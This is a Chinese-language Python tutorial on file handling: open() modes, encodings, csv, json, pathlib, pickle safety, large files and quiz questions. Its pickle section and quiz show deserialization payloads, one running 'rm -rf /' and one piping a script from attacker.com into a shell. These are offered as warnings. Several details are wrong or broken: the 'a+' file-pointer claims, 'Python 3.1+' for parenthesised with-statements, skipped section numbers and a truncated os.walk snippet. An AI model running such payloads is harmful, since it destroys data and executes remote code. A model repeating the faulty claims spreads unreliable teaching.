## 一、`open()` 与文件模式速查

```python
f = open("data.txt", mode="r", encoding="utf-8")
```

| 模式 | 含义 | 文件存在 | 文件不存在 | 指针位置 | 读 | 写 |
| --- | --- | --- | --- | --- | --- | --- |
| `'r'` | 只读（默认） | ✅ | ❌ 报错 | 开头 | ✅ | ❌ |
| `'r+'` | 读写 | ✅ | ❌ 报错 | 开头 | ✅ | ✅（覆写） |
| `'w'` | 只写 | ✅ 截断清空 | ✅ 新建 | 开头 | ❌ | ✅ |
| `'w+'` | 读写 | ✅ 截断清空 | ✅ 新建 | 开头 | ✅ | ✅ |
| `'a'` | 追加写 | ✅ | ✅ 新建 | 结尾 | ❌ | ✅ |
| `'a+'` | 读写 | ✅ | ✅ 新建 | **写时**结尾 | ✅ | ✅ |
| `'x'` | 独占创建 | ❌ 报错 | ✅ 新建 | 开头 | — | ✅ |
| `'b'` | 二进制修饰符 | 与上面组合使用 | | | | |
| `'t'` | 文本修饰符（默认） | | | | | |

### 1.1 文本模式 vs 二进制模式（关键）

```python
open("f.txt", "r")        # 文本：得到 str
open("f.bin", "rb")       # 二进制：得到 bytes
```

- 文本模式负责**编解码**：写入时 `str → encode → bytes`，读取时 `bytes → decode → str`；
- 二进制模式不做任何转换，适合图片、音频、`.xlsx`、网络包、非文本格式。

### 1.2 一个必须记住的区别

```python
# 'a' 模式写完后，指针在结尾
with open("f.txt", "a", encoding="utf-8") as f:
    f.write("abc")
    print(f.tell())        # 预期输出: 3

# 'a+' 模式的读指针在开头
with open("f.txt", "a+", encoding="utf-8") as f:
    f.write("xyz")
    print(f.read())        # 预期输出: xyzabc（追加后指针未移到末尾）
```

## 二、`with` 语句：必须掌握的写法

```python
with open("data.txt", "r", encoding="utf-8") as f:
    content = f.read()
# 离开 with 块时，文件自动关闭（即使中途抛异常）
```

**不用 `with` 的问题：**

```python
# 反例：异常发生时文件不会关闭
f = open("data.txt", encoding="utf-8")
content = f.read()      # 这里抛异常 -> f 永远不会 close()
f.close()
```

### 2.1 多个文件同时打开

```python
with open("src.txt", encoding="utf-8") as src, \
     open("dst.txt", "w", encoding="utf-8") as dst:
    dst.write(src.read())
```

Python 3.1+ 更简洁的写法（括号内换行）：

```python
with (
    open("src.txt", encoding="utf-8") as src,
    open("dst.txt", "w", encoding="utf-8") as dst,
):
    dst.write(src.read())
```

### 2.2 `with` 的返回值

`__enter__` 的返回值赋给 `as` 后的名字。如果不加 `as`，拿不到文件对象（但用得很少）。

```python
with open("f.txt", encoding="utf-8") as f:
    print(type(f))       # 预期输出: <class '_io.TextIOWrapper'>
```

### 2.3 `open()` 的常用参数

```python
open(
    "data.txt",
    mode="r",
    buffering=-1,           # -1 = 默认；0 = 不缓冲（二进制）；1 = 行缓冲（文本）；8192 = 字节数
    encoding="utf-8",       # 文本模式必须指定
    errors="strict",        # 解码错误的处理：strict（报错）/ ignore（丢弃）/ replace（替换）
    newline=None,           # 文本模式：None=通用换行（推荐）；""=不转换；"\n"=只认 \n
    closefd=True,
    opener=None,
)
```

**`newline=None` 是 Windows 上的关键**：读入时把 `\r\n`、`\r` 统一转成 `\n`，写出时把 `\n` 转成系统的 `\r\n`。这样跨平台生成的文本格式统一。

## 三、文本读写

### 3.1 一次读取

```python
with open("poem.txt", "r", encoding="utf-8") as f:
    whole = f.read()              # 全部
    f.seek(0)
    part = f.read(10)             # 前 10 个字符
```

假设文件内容为 `Hello, 世界！\n第二行\n`：

```python
with open("poem.txt", encoding="utf-8") as f:
    print(f.read())         # 预期输出: Hello, 世界！ \n第二行\n（全部内容）
```

### 3.2 逐行读取（重要）

```python
with open("poem.txt", encoding="utf-8") as f:
    for i, line in enumerate(f, 1):
        print(i, repr(line))    # repr 能看出末尾的 \n
```

三种逐行方式的区别：

```python
# ① 直接迭代文件对象（最快，惰性，面试常问）
for line in f: ...

# ② readline()：读一行，返回空字符串表示结束
while True:
    line = f.readline()
    if not line: break
    ...

# ③ readlines()：读所有行组成列表（大文件慎用）
lines = f.readlines()
```

**性能对比**：`for line in f` 内部用了缓冲区，比 `f.readlines()` 省内存，适合 GB 级文件；`readlines()` 会一次性把全部内容读进内存。

### 3.3 写入

```python
with open("out.txt", "w", encoding="utf-8", newline="") as f:
    f.write("第一行\n")
    f.writelines(["第二行\n", "第三行\n"])     # 接受可迭代字符串
```

**为什么写文本建议 `newline=""`？** 传空字符串表示不转换换行符，由你自己控制 `\n`；如果传 `None`，Windows 上 `\n` 会变成 `\r\n`。

### 3.4 混合模式

```python
with open("log.txt", "r+", encoding="utf-8") as f:
    f.seek(0, 2)              # 移动到文件末尾（0 = 起始，2 = 末尾）
    f.write("追加的一行\n")
    f.seek(0)                 # 回到开头才能读
    print(f.read(4))          # 预期输出: 文件前 4 个字符
```

`seek(offset, whence)` 三个值：`0` 从文件开头，`1` 从当前位置，`2` 从文件末尾。

## 四、编码：必须显式指定

### 4.1 为什么乱码

文件本质是**字节序列**，编码是字节与字符的映射约定。不指定 `encoding` 时，Python 在 Windows 上默认用 `cp936`（GBK），Linux 上用 `utf-8`，于是同一份代码换平台就乱码。

```python
# 读取：显示乱码
with open("gbk.txt", encoding="utf-8") as f:
    print(f.read())      # 预期输出: ������   （典型的替换字符）

# 正确读取 GBK 文件
with open("gbk.txt", encoding="gbk") as f:
    print(f.read())      # 预期输出: 中文正常显示
```

### 4.2 编码选择原则

| 场景 | encoding |
| --- | --- |
| 跨平台 / 新项目 | `utf-8`（**默认首选**） |
| Windows 简体中文遗留文件 | `gbk` |
| 日文遗留 | `shift_jis` / `cp932` |
| 程序内部字符串 | 与编码无关，`str` 就是 `str` |

**编码只影响"字节 ↔ 字符"的转换，不影响程序内部处理。**

### 4.3 处理不确定的编码

```python
import chardet

with open("unknown.txt", "rb") as f:
    raw = f.read()

enc = chardet.detect(raw)["encoding"]
print("猜测编码:", enc)

text = raw.decode(enc or "utf-8", errors="replace")
print(text)
```

### 4.4 容错策略

```python
open("f.txt", encoding="utf-8", errors="strict")      # 默认，出错即抛 UnicodeDecodeError
open("f.txt", encoding="utf-8", errors="ignore")       # 丢掉坏字节，会静默丢数据
open("f.txt", encoding="utf-8", errors="replace")      # 坏字节换成 U+FFFD，至少不崩溃
open("f.txt", encoding="utf-8", errors="backslashreplace")   # 转义成 \xNN，可还原
```

**读取外部数据时用 `errors="replace"` 更稳妥；处理自己的数据时保持 `strict`，让错误暴露。**

### 4.5 处理 BOM

Windows 记事本保存的 UTF-8 文件可能带 BOM（`\ufeff`）：

```python
with open("bom.txt", encoding="utf-8") as f:
    text = f.read()
print(text.startswith("\ufeff"))     # 预期输出: True，会污染首字符

# 正确做法
with open("bom.txt", encoding="utf-8-sig") as f:
    text = f.read()          # BOM 被自动去掉
print(text.startswith("\ufeff"))     # 预期输出: False
```

CSV 处理 Excel 文件时常用 `encoding="utf-8-sig"`。

## 五、CSV 模块

CSV 是**逗号分隔值**文件，坑很多：字段含逗号要加引号、字段含换行要加引号、不同程序的分隔符/编码不同。**永远不要手写 `line.split(",")`。**

### 5.1 基本读写

```python
import csv

data = [
    ["name", "age", "city"],
    ["张三", 28, "北京"],
    ["李四", 34, "上海"],
]

# 写
with open("users.csv", "w", newline="", encoding="utf-8") as f:
    writer = csv.writer(f)
    writer.writerows(data)      # 一次性写多行

# 读
with open("users.csv", newline="", encoding="utf-8") as f:
    reader = csv.reader(f)
    for row in reader:
        print(row)
# 预期输出:
# ['name', 'age', 'city']
# ['张三', '28', '北京']     ← 注意全是 str
# ['李四', '34', '上海']
```

**`newline=""` 是必须的**：否则 Windows 上空行会被读成两个空元素。

### 5.2 `DictReader` 与 `DictWriter`（实际工作中用得最多）

```python
import csv

data = [
    {"name": "张三", "age": 28, "city": "北京"},
    {"name": "李四", "age": 34, "city": "上海"},
]

# DictWriter 写
with open("users.csv", "w", newline="", encoding="utf-8") as f:
    fieldnames = ["name", "age", "city"]
    writer = csv.DictWriter(f, fieldnames=fieldnames)
    writer.writeheader()             # 写表头 —— DictWriter 不会自动写！
    writer.writerows(data)

# DictReader 读
with open("users.csv", newline="", encoding="utf-8") as f:
    reader = csv.DictReader(f)
    print(reader.fieldnames)        # 预期输出: ['name', 'age', 'city']
    for row in reader:
        print(row["name"], row["age"])
# 预期输出:
# 张三 28
# 李四 34
```

**常见坑：**

1. `DictWriter` 必须手动 `writeheader()`，否则没有表头。
2. `DictReader` 的字段顺序以**文件第一行**为准，不是你给的顺序。
3. 每行都是 `str`，数字要自己 `int()` 转换。
4. 行数少于表头时，缺失键的值为 `None`：

```python
# 处理缺失字段
name = row.get("name") or "未知"
```

5. 字段值含逗号、引号、换行时，csv 模块自动加引号 —— 这正是它比 `split` 强的地方：

```python
import io
buf = io.StringIO()
w = csv.writer(buf)
w.writerow(["a,b", 'he said "hi"', "line1\nline2"])
print(buf.getvalue())
# 预期输出类似:
# "a,b","he said ""hi""","line1
# line2"
```

### 5.3 常见方言

```python
# Excel 中文版导出的文件：GBK 编码 + CRLF
with open("excel.csv", newline="", encoding="gbk") as f:
    reader = csv.reader(f)

# 分隔符是分号（欧洲地区）
with open("semi.csv", newline="", encoding="utf-8") as f:
    reader = csv.reader(f, delimiter=";")

# 制表符分隔（也可用 csv.Sniffer 自动识别）
with open("data.tsv", newline="", encoding="utf-8") as f:
    dialect = csv.Sniffer().sniff(f.read(2048))
    f.seek(0)
    reader = csv.reader(f, dialect)
```

### 5.4 用 pandas 处理复杂 CSV

CSV 字段不规整、要做统计、几十万行时，`pandas` 更高效：

```python
import pandas as pd

df = pd.read_csv(
    "users.csv",
    encoding="utf-8",
    sep=",",
    header=0,
    usecols=["name", "age"],       # 只读需要的列，省内存
    dtype={"age": "int32"},        # 指定类型
    na_values=["", "N/A", "null"], # 自定义缺失值
    chunksize=10_000,              # 分块读取大文件
)

print(df.head())
print(df["age"].mean())
```

## 六、JSON 模块

JSON 是**事实上的数据交换标准**，接口返回、配置文件、数据导出几乎都是 JSON。

### 6.1 基本读写

```python
import json

data = {"name": "张三", "age": 28, "tags": ["python", "csv"], "active": True, "score": 9.5}

# 读
with open("data.json", "r", encoding="utf-8") as f:
    obj = json.load(f)             # 读取并解析为 Python 对象

# 写
with open("out.json", "w", encoding="utf-8") as f:
    json.dump(obj, f, ensure_ascii=False, indent=2)
```

写入后的文件内容：

```json
{
  "name": "张三",
  "age": 28,
  "tags": [
    "python",
    "csv"
  ],
  "active": true,
  "score": 9.5
}
```

**`ensure_ascii=False` 必须加**，否则中文会被转义成 `\u5f20\u4e09`，可读性极差。

### 6.2 dump 参数

| 参数 | 作用 |
| --- | --- |
| `ensure_ascii=False` | 中文不转义（几乎总该设） |
| `indent=2` | 缩进美化（开发/调试用；0 或 None 输出单行） |
| `separators=(",", ":")` | 去掉多余空格，压缩体积 |
| `sort_keys=True` | 键排序，输出稳定（便于对比） |
| `cls=` | 指定自定义 Encoder |

### 6.3 类型映射

| JSON | Python | 注意事项 |
| --- | --- | --- |
| object | `dict` | 键必须是字符串 |
| array | `list` | |
| string | `str` | |
| number | `int` / `float` | |
| true / false | `True` / `False` | |
| null | `None` | |

**JSON 不支持：元组、集合、`datetime`、自定义对象、`NaN`（Python 扩展，不标准）。**

### 6.4 自定义对象序列化

```python
import json
from datetime import datetime


class Student:
    def __init__(self, name, birth):
        self.name = name
        self.birth = birth          # datetime 对象


# 方式一：default 函数
def encode(obj):
    if isinstance(obj, datetime):
        return obj.strftime("%Y-%m-%d")
    if isinstance(obj, set):
        return list(obj)
    if hasattr(obj, "__dict__"):
        return obj.__dict__
    raise TypeError(f"无法序列化 {type(obj)}")


s = Student("张三", datetime(2000, 1, 15))
print(json.dumps(s, default=encode, ensure_ascii=False))
# 预期输出: {"name": "张三", "birth": "2000-01-15"}


# 方式二：自定义 Encoder 类
class MyEncoder(json.JSONEncoder):
    def default(self, o):
        if isinstance(o, datetime):
            return o.isoformat()
        return super().default(o)


print(json.dumps({"t": datetime(2024, 1, 1)}, cls=MyEncoder))
# 预期输出: {"t": "2024-01-01T00:00:00"}
```

### 6.5 反序列化

```python
# 普通方式
obj = json.loads(text)

# 保留对象类型
class Student:
    def __init__(self, name, age):
        self.name = name
        self.age = age

text = '{"name": "张三", "age": 20}'

s = json.loads(text, object_hook=lambda d: Student(**d))
print(s.name)     # 预期输出: 张三
print(type(s))    # 预期输出: <class '__main__.Student'>
```

处理可选字段要防御性：

```python
obj = json.loads(text)
name = obj.get("name", "未知")
age = obj.get("age")
if age is not None:
    age = int(age)
```

### 6.6 JSON Lines

大文件用 JSONL（一行一个 JSON 对象），可以流式处理：

```python
# 写
with open("data.jsonl", "w", encoding="utf-8") as f:
    for item in items:
        f.write(json.dumps(item, ensure_ascii=False) + "\n")

# 流式读
with open("data.jsonl", encoding="utf-8") as f:
    for line in f:
        item = json.loads(line)
        process(item)
```

## 七、pathlib 详解（现代推荐）

`pathlib` 用面向对象的方式处理路径，取代了几乎所有 `os.path` 用法。

### 7.1 创建路径对象

```python
from pathlib import Path

# 三种等价写法
p1 = Path("data/users.csv")
p2 = Path("data") / "users.csv"
p3 = Path("/home/me/project/data", "users", "a.csv")     # 多段拼接

print(p1)          # 预期输出: data\users.csv   （Windows）
print(p1.name)     # 预期输出: users.csv        （文件名）
print(p1.stem)     # 预期输出: users            （不含扩展名）
print(p1.suffix)   # 预期输出: .csv             （扩展名）
print(p1.parent)   # 预期输出: data             （父目录）
print(p1.parts)    # 预期输出: ('data', 'users.csv')
print(p1.parts[0]) # 预期输出: data
print(p1.is_absolute())   # 预期输出: False
```

### 7.2 路径运算（推荐用 `/`，不要用字符串拼接）

```python
base = Path("/home/me/project")

# 拼接
config = base / "configs" / "app.yaml"
print(config)      # 预期输出: /home/me/project/configs/app.yaml

# 修改部分
other = config.with_suffix(".json")       # 预期输出: /home/me/project/configs/app.json
other2 = config.with_name("db.yaml")     # 预期输出: /home/me/project/configs/db.yaml
parent = base.parent                      # 预期输出: /home/me
home = base / ".." / ".."                 # 预期输出: /home/me/project/../..

# 规范化（消除 ..）
print((base / "a" / ".." / "b").resolve())  # 预期输出(类 Unix): /home/me/project/b
```

### 7.3 查询状态

```python
p = Path("data/users.csv")
print(p.exists())        # 预期输出(文件存在时): True
print(p.is_file())       # True
print(p.is_dir())        # False
print(p.stat().st_size)  # 文件字节数
print(p.stat().st_mtime) # 修改时间（时间戳）

# 判断结果永远要用 if，不要用 assert
if not p.is_file():
    raise FileNotFoundError(f"配置文件缺失: {p}")
```

### 7.4 目录操作（完全替代 `os` / `os.path`）

```python
d = Path("data")

d.mkdir(parents=True, exist_ok=True)    # 创建目录（含多级，幂等）
d.mkdir()                                # 目录已存在 -> FileExistsError
(d / "sub").mkdir(exist_ok=True)         # 存在就跳过

list(d.iterdir())                        # 返回 Path 对象列表
list(d.glob("*.csv"))                     # 匹配当前层 -> [PosixPath('data/a.csv')]
list(d.rglob("*.csv"))                    # 递归匹配所有层
list(d.rglob("*.py"))                     # 递归找所有 py 文件

p = d / "a.txt"
p.rename(d / "b.txt")                     # 重命名/移动
p.unlink()                                # 删除文件（目录会报错）
p.unlink(missing_ok=True)                 # 文件不存在也不报错（Python 3.8+）

shutil.rmtree(d)                          # 删除整个目录树（危险，不可恢复）
```

### 7.5 遍历目录

```python
for item in Path("data").rglob("*"):
    if item.is_file():
        print(f"{item}  {item.stat().st_size} bytes")
```

更精细的控制（等价于 `os.walk`）：

```python
import os
for root, dirs, files in os.walk("data"):
```

### 7.7 用 pathlib 处理配置目录

```python
from pathlib import Path

def read_config(config_dir: Path) -> dict:
    """从配置目录读取所有 .ini 合并为一个 dict。"""
    if not config_dir.is_dir():
        raise NotADirectoryError(f"配置目录不存在: {config_dir}")

    merged = {}
    for path in sorted(config_dir.glob("*.ini")):      # sorted 保证顺序确定
        for line in path.read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            key, _, value = line.partition("=")
            merged[key.strip()] = value.strip()
    return merged
```

## 十一、pickle 与安全性

`pickle` 能序列化几乎任何 Python 对象（包括函数、类实例）。

### 11.1 基本用法

```python
import pickle

data = {"name": "张三", "scores": [90, 85, 92], "meta": {"v": 1}}

# 写
with open("data.pkl", "wb") as f:
    pickle.dump(data, f)             # 或 pickle.dumps(data)

# 读
with open("data.pkl", "rb") as f:
    loaded = pickle.load(f)          # 或 pickle.loads(f.read())

print(loaded["name"])                # 预期输出: 张三
print(loaded == data)                # 预期输出: True
```

### 11.2 **严重安全警告**

> **绝不要对不可信来源的数据使用 `pickle.load()`。**

`pickle` 的格式本质是**一段可执行的指令序列**，反序列化时会执行其中记录的任意操作：

```python
# 恶意 pickle 等价效果（示意，勿运行）
class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("rm -rf /",))

class Exploit:
    def __reduce__(self):
        return (eval, ("print('pwned')",))
```

所以：

| 场景 | 是否可用 pickle |
| --- | --- |
| 自己进程内、临时缓存 | ✅ 可以 |
| 自己机器上的本地文件 | ⚠️ 谨慎（文件可能被篡改） |
| 网络下载、用户上传 | ❌ 绝对不行 |
| 第三方提供的文件 | ❌ 绝对不行 |

**安全替代方案：**

```python
# 1) 纯数据 → JSON（最常用）
json.dumps(data)

# 2) NumPy / pandas → 有自己的格式
import numpy as np
np.save("arr.npy", arr)
np.savez("data.npz", a=arr_a, b=arr_b)

# 3) 需要高效复杂对象 → joblib / dill（注意同样不安全）
```

### 11.3 pickle 协议

```python
# protocol: 0=ASCII(旧), 2/3 兼容性最好, 4/5 最快
data = {"x": [1, 2, 3]}
blob = pickle.dumps(data, protocol=pickle.HIGHEST_PROTOCOL)   # 默认 5
print(len(blob))      # 预期输出: 43
print(pickle.loads(blob))   # 预期输出: {'x': [1, 2, 3]}
```

### 11.4 数据类的序列化

```python
import pickle
from dataclasses import dataclass

@dataclass
class User:
    name: str
    age: int

u = User("张三", 20)

# 方法一：转 dict 再用 json（推荐，可读、可跨语言）
import json
from dataclasses import asdict
print(json.dumps(asdict(u), ensure_ascii=False))
# 预期输出: {"name": "张三", "age": 20}

# 方法二：转 tuple（紧凑，安全）
t = (u.name, u.age)
blob = pickle.dumps(t)     # 等价于 Python 层面的元组，没有可执行内容
print(pickle.loads(blob))   # 预期输出: ('张三', 20)
```

**面试回答要点**：能用 JSON 就别用 pickle；必须用 pickle 时绝不处理外部数据；加密签名后再加载也不能替代"不加载不可信数据"。

## 十二、大文件处理

核心原则：**永远不要 `f.read()` 一个可能是几 GB 的文件。**

### 12.1 流式处理

```python
def count_lines(path):
    """逐行统计，不占内存。"""
    n = 0
    with open(path, encoding="utf-8") as f:
        for _ in f:            # 惰性读取，一次只有几 KB 在内存
            n += 1
    return n


def search_keyword(path, keyword):
    """在大文件中查找，返回前 5 个匹配行号。"""
    hits = []
    with open(path, encoding="utf-8") as f:
        for i, line in enumerate(f, 1):
            if keyword in line:
                hits.append((i, line.rstrip()))
                if len(hits) >= 5:
                    break
    return hits
```

### 12.2 分块读写

```python
CHUNK = 1024 * 1024   # 1 MB

# 复制大文件
def copy_large(src, dst):
    with open(src, "rb") as fin, open(dst, "wb") as fout:
        while chunk := fin.read(CHUNK):     # 3.8+ 海象运算符
            fout.write(chunk)

# 处理超长行（CSV 字段含换行时常见）
def read_long_lines(path, max_len=80):
    with open(path, encoding="utf-8") as f:
        buf = ""
        for chunk in iter(lambda: f.read(CHUNK), ""):
            buf += chunk
            while (idx := buf.find("\n")) != -1:
                line, buf = buf[:idx], buf[idx + 1:]
                if len(line) > max_len:
                    print(f"超长行 ({len(line)} 字符)")
            if len(buf) > max_len * 2:      # 防止 buf 无限增长
                print(f"单行超长: {len(buf)} 字符")
                buf = ""
```

### 12.3 大 CSV 分块处理

```python
import csv

# 纯标准库分块
def process_csv_in_chunks(path, chunk_size=50_000):
    with open(path, newline="", encoding="utf-8") as f:
        reader = csv.DictReader(f)
        batch = []
        for row in reader:
            batch.append(row)
            if len(batch) >= chunk_size:
                process(batch)
                batch = []
        if batch:
            process(batch)


def process(rows):
    print(f"处理了 {len(rows)} 行")
```

用 pandas 时直接指定 `chunksize`，返回可迭代对象：

```python
import pandas as pd

for chunk in pd.read_csv("big.csv", encoding="utf-8", chunksize=100_000):
    result = chunk[chunk["amount"] > 1000]
    print(f"本批 {len(result)} 条")
```

## 十三、常见面试题速答

1. **`'r+'` 与 `'w+'` 的区别？** `'r+'` 要求文件已存在且不清空；`'w+'` 会清空原内容，不存在则创建。
2. **为什么读写 CSV 要写 `newline=""`？** 让 csv 模块自己处理换行，避免 Windows 上 `\r\n` 被额外转换，出现空行。
3. **`json.dump` 中文乱码怎么办？** 加 `ensure_ascii=False`。
4. **为什么不能对外部数据用 pickle？** 反序列化会执行任意代码（`__reduce__`），是远程代码执行漏洞。
5. **`readlines()` 与 `for line in f` 的区别？** 前者一次性读入全部行占内存；后者惰性迭代，适合大文件且更快。
6. **pathlib 相比 os.path 的优势？** 面向对象、运算符拼接、跨平台、提供 `glob/rglob/iterdir`、返回值统一为 `Path` 对象。
7. **如何处理 GBK 文件？** `open(..., encoding="gbk")`；不确定时先用 `chardet` 检测。
8. **如何只读取大文件的前 100 行？** `itertools.islice(f, 100)` 或 `itertools.islice(open(f), 100)`。
9. **BOM 是什么？** 文件开头的字节序标记，会污染首个字符；用 `encoding="utf-8-sig"` 去除。
10. **为什么 `open` 后必须 `close`？** 释放文件句柄（Windows 上独占），刷新缓冲区；`with` 自动处理。
11. **什么是 `errors` 参数？** 控制解码/编码出错时的策略：`strict`（默认报错）、`ignore`、`replace`、`backslashreplace`。
12. **二进制读写什么时候用？** 任何非文本数据：图片、音视频、压缩包、Excel、序列化字节、协议包。

## 本节小结

- `open()` 模式要选对：只读 `'r'`、覆写 `'w'`、追加 `'a'`、读写 `'r+'`、独占 `'x'`；`'b'` 是二进制修饰符。
- **永远用 `with`**，它保证异常时也关闭文件；不要在 `finally` 里写 `return`（见上一节）。
- **文本读写必须显式指定 `encoding='utf-8'`**，跨平台才不会乱码；处理 BOM 用 `utf-8-sig`。
- 逐行用 `for line in f`，比 `readlines()` 省内存；写文件建议 `newline=""`。
- CSV 用 `csv` 模块（不是 `split`），读写都加 `newline=""`，`DictWriter` 要手动 `writeheader()`，`DictReader` 读出的全是字符串。
- JSON 写中文加 `ensure_ascii=False`，美化加 `indent`；自定义对象用 `default=` 或自定义 `Encoder`；大文件用 JSONL 流式处理。
- `pathlib` 是现代首选：`/` 拼接、`glob/rglob/iterdir`、`mkdir(exist_ok=True)`、`unlink(missing_ok=True)`、`.read_text/.write_text`。
- `os` 模块用于环境变量、`walk`、`scandir`；执行外部命令用 `subprocess` 不用 `os.system`。
- 临时文件用 `tempfile`，不要用固定文件名。
- 二进制读写配合 `struct` 处理数字，`bytearray` 处理可变缓冲区。
- pickle 能存任意对象但**绝不能加载不可信数据**，纯数据请用 JSON。
- 大文件必须流式/分块/内存映射；需要统计分析就用 pandas 的 `chunksize`。

## 自测题

<details>
<summary>1. `'r+'`、`'w+'`、`'a+'` 三种模式有什么区别？</summary>

**答案：**
| | 文件不存在 | 文件已存在 | 指针初始位置 |
| --- | --- | --- | --- |
| `'r+'` | 报错 `FileNotFoundError` | **不清空**原内容 | 开头 |
| `'w+'` | 新建 | **清空**原内容 | 开头 |
| `'a+'` | 新建 | 不清空 | 开头（但**任何写操作前会强制移到末尾**） |

三者的共同点：都支持读写。`'a+'` 的特殊性使得"追加后再立刻 `read()`"会读到新增内容后面的位置，需要 `seek(0)` 才能从头读。
</details>

<details>
<summary>2. 读取 CSV 文件时忘记写 `newline=""` 会在 Windows 上出现什么问题？</summary>

**答案：**
Windows 上 Python 的文本 I/O 默认会把 `\n` 转换成 `\r\n` 写出，而读取时又把 `\r\n` 转换回 `\n`。在 CSV 中这会导致：
- 写出时产生 `\r\r\n`，读回时变成两个换行 → **空行**；
- 跨平台生成的文件行尾不一致，解析错乱。

因此 `csv` 官方文档明确要求：读写 CSV 文件时 `open()` 必须传 `newline=""`，让 csv 模块自己处理引号内的换行。
</details>

<details>
<summary>3. 为什么 pickle 只能用于可信数据？举出攻击原理。</summary>

**答案：**
`pickle` 保存的不只是数据值，而是**一串可执行的操作指令**。当类定义了 `__reduce__`（或 `__reduce_ex__`）时，pickle 会把"如何重建该对象"记录为 `(可调用对象, 参数元组)`。

反序列化时它会：
1. 导入 pickle 中记录的模块；
2. 调用记录的可调用对象并传入参数。

因此攻击者构造的 payload 可以是 `(os.system, ("curl attacker.com/x.sh | sh",))` 或 `(eval, ("恶意代码",))`。受害者一旦 `pickle.load()`，代码立即以受害者权限执行 —— 这就是一个远程代码执行漏洞。

**安全实践**：纯数据用 JSON / `json` 替代；NumPy 用 `np.save`；绝不 `pickle.load()` 任何来自网络、用户上传、第三方、或自己无法验证完整性的文件。
</details>

<details>
<summary>4. 用 `json.dumps` 写入含中文的 dict，文件里出现了 `\u5f20\u4e09`，如何解决？</summary>

**答案：**
`json.dumps` 默认 `ensure_ascii=True`，会把所有非 ASCII 字符转成 `\uXXXX` 转义序列。解决：

```python
with open("out.json", "w", encoding="utf-8") as f:
    json.dump(data, f, ensure_ascii=False, indent=2)
```

读取时同样无需特殊处理，`json.load` 会自动解码回来（前提是文件本身以 UTF-8 写入，即 `encoding="utf-8"`）。
</details>

<details>
<summary>5. 用 `pathlib` 写出等价于 `os.path.join(base, "a", "b.txt")` 且返回绝对规范化路径的代码。</summary>

**答案：**
```python
from pathlib import Path

base = Path("/home/me/project")
result = (base / "a" / "b.txt").resolve()
print(result)      # 预期输出: /home/me/project/a/b.txt
```

`resolve()` 会展开 `~`、转成绝对路径并消除 `.` 与 `..`。若只需消除 `..` 而保持相对，用 `os.path.normpath` 或 `Path(...).absolute()`（不消除 `..`）。
</details>

<details>
<summary>6. 如何逐行处理一个 5 GB 的日志文件，且内存占用保持在几十 MB 以内？</summary>

**答案：**
```python
def process_big_log(path, keyword="ERROR"):
    with open(path, encoding="utf-8", errors="replace") as f:
        for lineno, line in enumerate(f, 1):    # 惰性迭代，内存仅一行
            if keyword in line:
                print(f"{lineno}: {line.rstrip()}")
```

关键点：
1. **绝不用 `f.read()` / `f.readlines()`**（会加载全部内容）；
2. `for line in f` 内部有缓冲区，比手动 `readline()` 快，且内存占用恒定；
3. `errors="replace"` 防止个别坏字节导致整个任务失败（处理外部数据时）；
4. 若单行本身极大（无换行符的长行），改用分块读取 + 手写缓冲（见本节 12.2）；
5. 需要按列统计时用 `pandas` 的 `chunksize`。
</details>

<details>
<summary>7. `open("f.txt", "w")` 与 `open("f.txt", "w", encoding="utf-8")` 在不同平台上有什么隐患？</summary>

**答案：**
不指定 `encoding` 时，Python 使用**系统默认编码**：Windows 中文版是 `cp936`（GBK），Linux/macOS 通常是 `utf-8`。

隐患：
1. **乱码**：在 Linux 写入中文文件拿到 Windows 读取，会抛 `UnicodeDecodeError`；反过来写入也可能直接报错。
2. **跨平台不一致**：同一份代码在不同机器上行为不同，CI/生产环境容易出问题。
3. **丢失字符**：某些编码（如 `ascii`、某些 locale）无法表示某些字符，写入时抛错或丢失。

结论：**任何文本文件的读写都显式写 `encoding="utf-8"`**，需要兼容 Windows 遗留文件时用 `encoding="gbk"`，处理带 BOM 的文件用 `encoding="utf-8-sig"`。
</details>

<details>
<summary>8. 什么时候应该用二进制模式而不是文本模式？</summary>

**答案：**
凡是不以"人类可读文本"形式存储的内容，都用 `'b'` 模式：
- 图片、音频、视频、字体（`.png` `.jpg` `.mp3` `.woff`）；
- 压缩包、数据库、序列化字节（`.zip` `.sqlite` `.pkl` `.parquet`）；
- Excel 等 OLE 复合文档（`.xlsx` `.docx`，本质是 zip）；
- 网络协议报文、自定义二进制格式（配合 `struct`）；
- 读取不需要解码的原样字节（如做哈希计算、签名校验）。

判断标准：**数据本身是不是"字符的编码结果"**。是 → 文本模式 + encoding；不是 → 二进制模式。
</details>
